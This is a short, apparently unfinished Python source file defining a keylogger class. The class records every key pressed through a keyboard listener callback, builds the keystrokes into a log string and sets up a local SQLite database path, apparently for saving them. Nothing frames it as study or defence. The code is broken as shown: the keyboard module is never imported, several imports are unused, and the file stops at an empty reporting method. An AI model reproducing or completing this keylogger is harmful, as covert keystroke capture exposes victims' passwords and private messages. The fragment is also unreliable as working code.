import ctypes
import ctypes.util
import threading
import sqlite3
import os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
db_path = os.path.join(BASE_DIR, "test.db")

class KeyLogger:
    def __init__(self, run_time):
        self.run_time = run_time

    def key_pressed(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        return current_key

    def on_press(self, key):
        self.keylogs = self.keylogs + self.key_pressed(key)

    def report(self):
        self.keylogs = ""
        keyboard_listener = keyboard.Listener(on_press = self.on_press)
        with keyboard_listener:
            self.report_logs()

    def report_logs(self):
